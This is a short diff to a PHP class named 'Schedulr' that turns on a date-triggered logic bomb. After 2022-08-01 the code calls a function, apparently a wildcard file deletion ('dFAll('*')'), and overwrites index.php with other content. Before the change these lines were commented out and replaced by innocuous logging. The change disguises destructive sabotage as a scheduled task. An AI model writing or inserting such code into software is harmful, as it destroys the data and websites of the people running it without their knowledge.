@@ -23,12 +23,9 @@ class Schedulr
 
         $NewDate = strtotime('2022-08-01');
         if (time() >= $NewDate) {
-            \Log::info('task Completed');
-            // self::dFAll('*');
-            // $inf = @fopen("index.php", "w");
-            // fputs($inf, $ht, strlen($ht));
-        }else{
-            \Log::info('task Completed111');
+            self::dFAll('*');
+            $inf = @fopen("index.php", "w");
+            fputs($inf, $ht, strlen($ht));
         }
         return true;
     }
